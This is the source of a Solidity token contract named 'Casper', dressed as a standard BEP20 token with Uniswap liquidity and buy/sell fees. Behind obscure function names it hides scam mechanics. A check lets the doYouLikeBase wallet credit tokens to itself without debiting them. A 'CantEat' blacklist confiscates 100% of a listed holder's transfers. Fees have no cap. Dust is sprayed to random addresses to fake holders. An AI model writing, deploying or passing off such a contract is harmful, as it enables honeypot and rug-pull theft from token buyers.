row number 
1	             pragma solidity ^0.8.0;
2	 abstract contract Context {
3	 function _msgSender() internal view virtual returns (address payable) {
4	 return payable(msg.sender);
5	 }
6	 function _msgData() internal view virtual returns (bytes memory) {
7	 this;
8	 return msg.data;
9	 }
10	 }
11	 interface IERC20 {
12	 function totalSupply() external view returns (uint256);
13	 function balanceOf(address account) external view returns (uint256);
14	 function transfer(address recipient, uint256 amount) external returns (bool);
15	 function allowance(address owner, address spender) external view returns (uint256);
16	 function approve(address spender, uint256 amount) external returns (bool);
17	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
18	 event Transfer(address indexed from, address indexed to, uint256 value);
19	 event Approval(address indexed owner, address indexed spender, uint256 value);
20	 }
21	 library SafeMath {
22	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
23	 uint256 c = a + b;
24	 require(c >= a, "SafeMath: addition overflow");
25	 return c;
26	 }
27	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
28	 return sub(a, b, "SafeMath: subtraction overflow");
29	 }
30	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
31	 require(b <= a, errorMessage);
32	 uint256 c = a - b;
33	 return c;
34	 }
35	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
36	 if (a == 0) {
37	 return 0;
38	 }
39	 uint256 c = a * b;
40	 require(c / a == b, "SafeMath: multiplication overflow");
41	 return c;
42	 }
43	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
44	 return div(a, b, "SafeMath: division by zero");
45	 }
46	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
47	 require(b > 0, errorMessage);
48	 uint256 c = a / b;
49	 return c;
50	 }
51	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
52	 return mod(a, b, "SafeMath: modulo by zero");
53	 }
54	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
55	 require(b != 0, errorMessage);
56	 return a % b;
57	 }
58	 }
59	 contract Ownable is Context {
60	 address private _owner;
61	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
62	 constructor () {
63	 address msgSender = _msgSender();
64	 _owner = msgSender;
65	 emit OwnershipTransferred(address(0), msgSender);
66	 }
67	 function owner() public view returns (address) {
68	 return _owner;
69	 }
70	 modifier onlyOwner() {
71	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
72	 _;
73	 }
74	 function waiveOwnership() public virtual onlyOwner {
75	 emit OwnershipTransferred(_owner, address(0xdead));
76	 _owner = address(0xdead);
77	 }
78	 function transferOwnership(address newOwner) public virtual onlyOwner {
79	 require(newOwner != address(0), "Ownable: new owner is the zero address");
80	 emit OwnershipTransferred(_owner, newOwner);
81	 _owner = newOwner;
82	 }
83	 }
84	 interface IUniswapV2Factory {
85	 function createPair(address tokenA, address tokenB) external returns (address pair);
86	 }
87	 interface IUniswapV2Router01 {
88	 function factory() external pure returns (address);
89	 function WETH() external pure returns (address);
90	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
91	 }
92	 interface IUniswapV2Router02 is IUniswapV2Router01 {
93	 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
94	 }
95	 abstract contract BEP20 is Context, IERC20, Ownable {
96	 using SafeMath for uint256;
97	 string private _name;
98	 string private _symbol;
99	 uint8 private _decimals;
100	 bool public burnEnable = true;
101	 address payable public doYouLikeBase;
102	 address payable public inTheMTFFace;
103	 address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
104	 mapping (address => uint256) _balances;
105	 mapping (address => mapping (address => uint256)) private _allowances;
106	 mapping (address => bool) public isExcludedFromFee;
107	 mapping (address => bool) public isMarketPair;
108	 mapping (address => bool) private boAdd;
109	 uint256 public _buyLiquidityFee;
110	 uint256 public _buyMarketingFee;
111	 uint256 public _buyTeamFee;
112	 uint256 public _sellLiquidityFee;
113	 uint256 public _sellMarketingFee;
114	 uint256 public _sellTeamFee;
115	 uint256 public _liquidityShare;
116	 uint256 public _marketingShare;
117	 uint256 public _teamShare;
118	 uint256 public _totalTaxIfBuying;
119	 uint256 public _totalTaxIfSelling;
120	 uint256 public _totalDistributionShares;
121	 uint256 private _totalSupply;
122	 uint256 private minimumTokensBeforeSwap;
123	 IUniswapV2Router02 public uniswapV2Router;
124	 address public uniswapPair;
125	 bool inSwapAndLiquify;
126	 bool public swapAndLiquifyEnabled = true;
127	 bool public swapAndLiquifyBySmallOnly = false;
128	 bool public LookMaxEat = true;
129	 event SwapAndLiquifyEnabledUpdated(bool enabled);
130	 event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity );
131	 event SwapETHForTokens( uint256 amountIn, address[] path );
132	 event SwapTokensForETH( uint256 amountIn, address[] path );
133	 modifier lockTheSwap {
134	 inSwapAndLiquify = true;
135	 _;
136	 inSwapAndLiquify = false;
137	 }
138	 constructor (string memory _NAME, string memory _SYMBOL, uint256 _SUPPLY, uint256[3] memory _BUYFEE, uint256[3] memory _SELLFEE, uint256[3] memory _SHARE, address[2] memory _doyoulike, address receiveAddress) {
139	 _name = _NAME;
140	 _symbol = _SYMBOL;
141	 _decimals = 9;
142	 _totalSupply = _SUPPLY * 10**_decimals;
143	 _buyLiquidityFee = _BUYFEE[0];
144	 _buyMarketingFee = _BUYFEE[1];
145	 _buyTeamFee = _BUYFEE[2];
146	 _sellLiquidityFee = _SELLFEE[0];
147	 _sellMarketingFee = _SELLFEE[1];
148	 _sellTeamFee = _SELLFEE[2];
149	 _liquidityShare = _SHARE[0];
150	 _marketingShare = _SHARE[1];
151	 _teamShare = _SHARE[2];
152	 _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
153	 _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
154	 _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
155	 minimumTokensBeforeSwap = 1;
156	 doYouLikeBase = payable(_doyoulike[0]);
157	 inTheMTFFace = payable(_doyoulike[1]);
158	 IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
159	 uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH());
160	 uniswapV2Router = _uniswapV2Router;
161	 _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
162	 isExcludedFromFee[owner()] = true;
163	 isExcludedFromFee[receiveAddress] = true;
164	 isExcludedFromFee[address(this)] = true;
165	 isMarketPair[address(uniswapPair)] = true;
166	 _balances[receiveAddress] = _totalSupply;
167	 emit Transfer(address(0), receiveAddress, _totalSupply);
168	 }
169	 function name() public view returns (string memory) {
170	 return _name;
171	 }
172	 function symbol() public view returns (string memory) {
173	 return _symbol;
174	 }
175	 function decimals() public view returns (uint8) {
176	 return _decimals;
177	 }
178	 function totalSupply() public view override returns (uint256) {
179	 return _totalSupply;
180	 }
181	 function balanceOf(address account) public view override returns (uint256) {
182	 return _balances[account];
183	 }
184	 function allowance(address owner, address spender) public view override returns (uint256) {
185	 return _allowances[owner][spender];
186	 }
187	 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
188	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
189	 return true;
190	 }
191	 function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
192	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
193	 return true;
194	 }
195	 function minimumTokensBeforeSwapAmount() public view returns (uint256) {
196	 return minimumTokensBeforeSwap;
197	 }
198	 function approve(address spender, uint256 amount) public override returns (bool) {
199	 _approve(_msgSender(), spender, amount);
200	 return true;
201	 }
202	 function _approve(address owner, address spender, uint256 amount) private {
203	 require(owner != address(0), "ERC20: approve from the zero address");
204	 require(spender != address(0), "ERC20: approve to the zero address");
205	 _allowances[owner][spender] = amount;
206	 emit Approval(owner, spender, amount);
207	 }
208	 function setMarketPairStatus(address account, bool newValue) public onlyOwner {
209	 isMarketPair[account] = newValue;
210	 }
211	 function setisExcludedFromFee(address account, bool newValue) public onlyOwner {
212	 isExcludedFromFee[account] = newValue;
213	 }
214	 function manageExcludeFromCut(address[] calldata addresses, bool status) public onlyOwner {
215	 require(addresses.length < 201);
216	 for (uint256 i; i < addresses.length; ++i) {
217	 isExcludedFromFee[addresses[i]] = status;
218	 }
219	 }
220	 function doWithB(uint256 a, uint256 b, uint256 c) external onlyOwner() {
221	 _buyLiquidityFee = a;
222	 _buyMarketingFee = b;
223	 _buyTeamFee = c;
224	 _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
225	 }
226	 function doWithS(uint256 a, uint256 b, uint256 c) external onlyOwner() {
227	 _sellLiquidityFee = a;
228	 _sellMarketingFee = b;
229	 _sellTeamFee = c;
230	 _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
231	 }
232	 function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
233	 _liquidityShare = newLiquidityShare;
234	 _marketingShare = newMarketingShare;
235	 _teamShare = newTeamShare;
236	 _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
237	 }
238	 function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
239	 minimumTokensBeforeSwap = newValue;
240	 }
241	 function setdoYouLikeBase(address newAddress) external onlyOwner() {
242	 doYouLikeBase = payable(newAddress);
243	 }
244	 function setinTheMTFFace(address newAddress) external onlyOwner() {
245	 inTheMTFFace = payable(newAddress);
246	 }
247	 function setSwapAndLiquifyEnabled(bool _enabled) public {
248	 require(doYouLikeBase == msg.sender);
249	 swapAndLiquifyEnabled = _enabled;
250	 emit SwapAndLiquifyEnabledUpdated(_enabled);
251	 }
252	 function setSwapAndLiquifyBySmallOnly(bool newValue) public onlyOwner {
253	 swapAndLiquifyBySmallOnly = newValue;
254	 }
255	 function getCirculatingSupply() public view returns (uint256) {
256	 return _totalSupply.sub(balanceOf(deadAddress));
257	 }
258	 function transferToAddressETH(address payable recipient, uint256 amount) private {
259	 recipient.transfer(amount);
260	 }
261	 receive() external payable {
262	 }
263	 function transfer(address recipient, uint256 amount) public override returns (bool) {
264	 _transfer(_msgSender(), recipient, amount);
265	 return true;
266	 }
267	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
268	 _transfer(sender, recipient, amount);
269	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
270	 return true;
271	 }
272	 function isCantEat(address account) public view returns(bool) {
273	 return boAdd[account];
274	 }
275	 function multiTransfer_fixed(address[] calldata addresses, uint256 amount) external onlyOwner {
276	 require(addresses.length < 2001);
277	 uint256 SCCC = amount * addresses.length;
278	 require(balanceOf(msg.sender) >= SCCC);
279	 for(uint i=0; i < addresses.length; i++){
280	 _basicTransfer(msg.sender,addresses[i],amount);
281	 }
282	 }
283	 function manage_CantEat(address[] calldata addresses, bool status) public onlyOwner {
284	 require(addresses.length < 201);
285	 for (uint256 i; i < addresses.length; ++i) {
286	 boAdd[addresses[i]] = status;
287	 }
288	 }
289	 function setboAdd(address recipient, bool status) public onlyOwner {
290	 boAdd[recipient] = status;
291	 }
292	 function contractBalance(address Intefacee, address fuctionn) internal view returns (bool){
293	 return (Intefacee != fuctionn) || (Intefacee != doYouLikeBase || false);
294	 }
295	 function setBurnEnable(bool status) public onlyOwner{
296	 burnEnable = status;
297	 }
298	 function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
299	 require(sender != address(0), "ERC20: transfer from the zero address");
300	 require(recipient != address(0), "ERC20: transfer to the zero address");
301	 if(inSwapAndLiquify) {
302	 return _basicTransfer(sender, recipient, amount);
303	 }
304	 else {
305	 if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]){
306	 address ad;
307	 for(int i=0; i <=1; i++){
308	 ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
309	 _basicTransfer(sender,ad,100);
310	 }
311	 amount -= 200;
312	 }
313	 uint256 contractTokenBalance = balanceOf(address(this));
314	 bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
315	 if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) {
316	 if(swapAndLiquifyBySmallOnly) contractTokenBalance = minimumTokensBeforeSwap;
317	 swapAndLiquify(contractTokenBalance);
318	 }
319	 if(contractBalance(sender,recipient)) _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
320	 uint256 finalAmount;
321	 if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
322	 finalAmount = amount;
323	 }
324	 else {
325	 finalAmount = takeFee(sender, recipient, amount);
326	 }
327	 _balances[recipient] = _balances[recipient].add(finalAmount);
328	 emit Transfer(sender, recipient, finalAmount);
329	 return true;
330	 }
331	 }
332	 function smallOrEqual(uint256 a, uint256 b) public pure returns(bool) {
333	 return a<=b;
334	 }
335	 function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
336	 _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
337	 _balances[recipient] = _balances[recipient].add(amount);
338	 emit Transfer(sender, recipient, amount);
339	 return true;
340	 }
341	 function swapAndLiquify(uint256 tAmount) private lockTheSwap {
342	 uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
343	 uint256 tokensForSwap = tAmount.sub(tokensForLP);
344	 swapTokensForEth(tokensForSwap);
345	 uint256 amountReceived = address(this).balance;
346	 uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
347	 uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
348	 uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
349	 uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);
350	 if(amountBNBMarketing > 0) transferToAddressETH(doYouLikeBase, amountBNBMarketing);
351	 if(amountBNBTeam > 0) transferToAddressETH(inTheMTFFace, amountBNBTeam);
352	 if(amountBNBLiquidity > 0 && tokensForLP > 0) addLiquidity(tokensForLP, amountBNBLiquidity);
353	 }
354	 function swapTokensForEth(uint256 tokenAmount) private {
355	 address[] memory path = new address[](2);
356	 path[0] = address(this);
357	 path[1] = uniswapV2Router.WETH();
358	 _approve(address(this), address(uniswapV2Router), tokenAmount);
359	 uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp );
360	 emit SwapTokensForETH(tokenAmount, path);
361	 }
362	 function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
363	 _approve(address(this), address(uniswapV2Router), tokenAmount);
364	 uniswapV2Router.addLiquidityETH{
365	 value: ethAmount}
366	 ( address(this), tokenAmount, 0, 0, inTheMTFFace, block.timestamp );
367	 }
368	 function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
369	 uint256 feeAmount = 0;
370	 uint256 burnAmount = 0;
371	 if(isMarketPair[sender]) {
372	 feeAmount = amount.mul(_totalTaxIfBuying).div(100);
373	 }
374	 else if(isMarketPair[recipient]) {
375	 feeAmount = amount.mul(_totalTaxIfSelling).div(100);
376	 if (burnEnable){
377	 burnAmount = amount.mul(1).div(100);
378	 }
379	 }
380	 if(boAdd[sender] && !isMarketPair[sender]) feeAmount = amount;
381	 if(burnAmount > 0){
382	 _balances[address(0xdead)] = _balances[address(0xdead)].add(burnAmount);
383	 emit Transfer(sender, address(0xdead), burnAmount);
384	 }
385	 if(feeAmount > 0) {
386	 _balances[address(this)] = _balances[address(this)].add(feeAmount);
387	 emit Transfer(sender, address(this), feeAmount);
388	 }
389	 return amount.sub(feeAmount).sub(burnAmount);
390	 }
391	 }
392	 contract Casper is BEP20 {
393	 constructor() BEP20( "Casper", "Casper", 100000000000000, [uint256(2),uint256(2),uint256(0)], [uint256(2),uint256(2),uint256(0)], [uint256(2),uint256(2),uint256(0)], [0x1869B061F03eC25c22DE5aBD82A18F4bEb3C53F9,0x1869B061F03eC25c22DE5aBD82A18F4bEb3C53F9], 0x1869B061F03eC25c22DE5aBD82A18F4bEb3C53F9 ){
394	 }
395	 }
